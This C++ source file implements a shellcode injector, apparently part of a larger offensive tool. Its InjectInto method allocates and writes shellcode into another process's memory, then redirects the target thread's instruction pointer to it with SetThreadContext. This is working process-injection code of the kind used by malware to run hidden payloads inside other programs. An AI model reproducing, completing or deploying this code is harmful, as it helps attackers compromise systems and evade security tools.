#include "injection/shellcode/ShellcodeInjector.h"

ShellcodeInjector::ShellcodeInjector() noexcept
{}

/*
ShellcodeInjector::ShellcodeInjector(PROCESS_INFORMATION& pi, const std::vector<unsigned char>& shellcode) {
    InjectInto(pi, shellcode);
}
*/
bool ShellcodeInjector::InjectInto(PROCESS_INFORMATION& pi, const std::vector<unsigned char>& shellcode) noexcept {
    LPVOID shellcodeAddress = _AllocateRemoteMemory(pi.hProcess, shellcode.size());
    _WriteRemoteMemory(pi.hProcess, shellcodeAddress, shellcode.data(), shellcode.size());

    CONTEXT ctx = _GetProcessContext(pi.hThread);
    ctx.Rip = (DWORD64)shellcodeAddress;

    threadContext = api.SetThreadContext(pi.hThread, &ctx);
    if (!threadContext) {
        Logger::error("Issues adjusting thread context.");
        return false;
    }

    return threadContext;
}

BOOL ShellcodeInjector::GetThreadContext() {
    return threadContext;
}

CONTEXT ShellcodeInjector::_GetProcessContext(HANDLE hThread) {
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	if (!api.GetThreadContext(hThread, &ctx)) {
		std::cerr << "Error obteniendo el contexto del hilo: " << GetLastError() << std::endl;
		throw std::runtime_error("Error obteniendo el contexto del hilo");
	}

	return ctx;
}
